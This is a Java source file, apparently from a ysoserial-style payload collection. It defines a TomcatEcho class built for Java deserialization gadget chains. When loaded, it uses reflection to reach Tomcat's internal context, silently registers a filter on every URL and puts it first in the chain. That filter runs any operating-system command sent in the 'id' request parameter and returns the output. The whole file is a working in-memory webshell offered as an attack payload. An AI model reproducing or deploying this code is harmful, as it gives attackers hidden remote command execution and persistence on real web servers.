package com.ding0x0.yso.payloads;


import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import java.io.IOException;
import java.lang.reflect.Method;
import javax.servlet.Filter;
import javax.servlet.FilterChain;
import javax.servlet.FilterConfig;
import javax.servlet.ServletContext;
import javax.servlet.ServletException;
import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;

public class TomcatEcho extends AbstractTranslet implements Filter {
    private final String cmdParamName = "id";
    private final static String filterUrlPattern = "/*";
    private final static String filterName = "toncat";

    static {
        try {
            javax.servlet.ServletContext servletContext = getServletContext();
            if (servletContext != null) {
                Class c = Class.forName("org.apache.catalina.core.StandardContext");
                Object standardContext = null;
                if (servletContext.getFilterRegistration(filterName) == null) {
                    for (; standardContext == null; ) {
                        java.lang.reflect.Field contextField = servletContext.getClass().getDeclaredField("context");
                        contextField.setAccessible(true);
                        Object o = contextField.get(servletContext);
                        if (o instanceof javax.servlet.ServletContext) {
                            servletContext = (javax.servlet.ServletContext) o;
                        } else if (c.isAssignableFrom(o.getClass())) {
                            standardContext = o;
                        }
                    }
                    if (standardContext != null) {
                        java.lang.reflect.Field stateField = org.apache.catalina.util.LifecycleBase.class
                                .getDeclaredField("state");
                        stateField.setAccessible(true);
                        stateField.set(standardContext, org.apache.catalina.LifecycleState.STARTING_PREP);
                        Filter toncat = new TomcatEcho();
                        javax.servlet.FilterRegistration.Dynamic filterRegistration = servletContext
                                .addFilter(filterName, toncat);
                        filterRegistration.setInitParameter("encoding", "utf-8");
                        filterRegistration.setAsyncSupported(false);
                        filterRegistration
                                .addMappingForUrlPatterns(java.util.EnumSet.of(javax.servlet.DispatcherType.REQUEST), false,
                                        new String[]{"/*"});
                        if (stateField != null) {
                            stateField.set(standardContext, org.apache.catalina.LifecycleState.STARTED);
                        }

                        if (standardContext != null) {
                            Method filterStartMethod = org.apache.catalina.core.StandardContext.class
                                    .getMethod("filterStart");
                            filterStartMethod.setAccessible(true);
                            filterStartMethod.invoke(standardContext, null);

                            Class ccc = null;
                            try {
                                ccc = Class.forName("org.apache.tomcat.util.descriptor.web.FilterMap");
                            } catch (Throwable t){}
                            if (ccc == null) {
                                try {
                                    ccc = Class.forName("org.apache.catalina.deploy.FilterMap");
                                } catch (Throwable t){}
                            }
                            Method m = c.getMethod("findFilterMaps");
                            Object[] filterMaps = (Object[]) m.invoke(standardContext);
                            Object[] tmpFilterMaps = new Object[filterMaps.length];
                            int index = 1;
                            for (int i = 0; i < filterMaps.length; i++) {
                                Object o = filterMaps[i];
                                m = ccc.getMethod("getFilterName");
                                String name = (String) m.invoke(o);
                                if (name.equalsIgnoreCase(filterName)) {
                                    tmpFilterMaps[0] = o;
                                } else {
                                    tmpFilterMaps[index++] = filterMaps[i];
                                }
                            }
                            for (int i = 0; i < filterMaps.length; i++) {
                                filterMaps[i] = tmpFilterMaps[i];
                            }
                        }
                    }
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private static ServletContext getServletContext()
            throws NoSuchFieldException, IllegalAccessException, ClassNotFoundException {
        ServletRequest servletRequest = null;
        Class c = Class.forName("org.apache.catalina.core.ApplicationFilterChain");
        java.lang.reflect.Field f = c.getDeclaredField("lastServicedRequest");
        f.setAccessible(true);
        ThreadLocal threadLocal = (ThreadLocal) f.get(null);
        if (threadLocal != null && threadLocal.get() != null) {
            servletRequest = (ServletRequest) threadLocal.get();
        }
        if (servletRequest == null) {
            try {
                c = Class.forName("org.springframework.web.context.request.RequestContextHolder");
                Method m = c.getMethod("getRequestAttributes");
                Object o = m.invoke(null);
                c = Class.forName("org.springframework.web.context.request.ServletRequestAttributes");
                m = c.getMethod("getRequest");
                servletRequest = (ServletRequest) m.invoke(o);
            } catch (Throwable t) {}
        }
        if (servletRequest != null)
            return servletRequest.getServletContext();
        try {
            c = Class.forName("org.springframework.web.context.ContextLoader");
            Method m = c.getMethod("getCurrentWebApplicationContext");
            Object o = m.invoke(null);
            c = Class.forName("org.springframework.web.context.WebApplicationContext");
            m = c.getMethod("getServletContext");
            ServletContext servletContext = (ServletContext) m.invoke(o);
            return servletContext;
        } catch (Throwable t) {}
        return null;
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler)
            throws TransletException {

    }

    @Override
    public void init(FilterConfig filterConfig) throws ServletException {

    }

    @Override
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse,
                         FilterChain filterChain) throws IOException, ServletException {
        String cmd;
        if ((cmd = servletRequest.getParameter(cmdParamName)) != null) {
            Process process = Runtime.getRuntime().exec(cmd);
            java.io.BufferedReader bufferedReader = new java.io.BufferedReader(
                    new java.io.InputStreamReader(process.getInputStream()));
            StringBuilder stringBuilder = new StringBuilder();
            String line;
            while ((line = bufferedReader.readLine()) != null) {
                stringBuilder.append(line + '\n');
            }
            servletResponse.getOutputStream().write(stringBuilder.toString().getBytes());
            servletResponse.getOutputStream().flush();
            servletResponse.getOutputStream().close();
            return;
        }
        filterChain.doFilter(servletRequest, servletResponse);
    }

    @Override
    public void destroy() {

    }
}
